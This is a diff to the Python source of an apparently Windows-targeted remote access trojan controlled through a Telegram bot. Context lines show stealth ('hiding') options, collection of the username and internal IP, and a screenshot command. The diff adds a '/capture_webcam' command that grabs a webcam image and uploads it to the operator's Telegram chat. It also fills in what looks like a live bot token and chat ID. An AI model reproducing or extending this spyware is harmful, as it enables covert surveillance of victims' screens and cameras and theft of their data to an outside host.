@@ -29,15 +29,17 @@ import socket											# internal IP
 import getpass											# get username
 import collections
 import urllib# wallpaper
+import cv2#webcam
+from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = 'xxxx:xxxx' # you can set your environment variable as well
+token = '665355978:AAFjGAzwDccWzL2yJc9WJm7EQQXYxFYsqL0' # you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'APP NAME'
+app_name = 'speedyb3'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = ['123']
+known_ids = ['543537120']
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
@@ -216,6 +218,21 @@ def handle(msg):
                                 for line in lines:
                                         line.replace('\n\n', '\n')
                                         response += line
+                        elif command == '/capture_webcam':
+                                bot.sendChatAction(chat_id, 'typing')
+                                camera = cv2.VideoCapture(0)
+                                while True:
+                                        return_value,image = camera.read()
+                                        gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
+                                        cv2.imshow('image',gray)
+                                        if cv2.waitKey(1)& 0xFF == ord('s'):
+                                                cv2.imwrite('webcam.jpg',image)
+                                                break
+                                camera.release()
+                                cv2.destroyAllWindows()
+                                bot.sendChatAction(chat_id, 'upload_photo')
+                                bot.sendDocument(chat_id, open('webcam.jpg', 'rb'))
+                                os.remove('webcam.jpg')
                         elif command == '/capture_pc':
                                 bot.sendChatAction(chat_id, 'typing')
                                 screenshot = ImageGrab.grab()
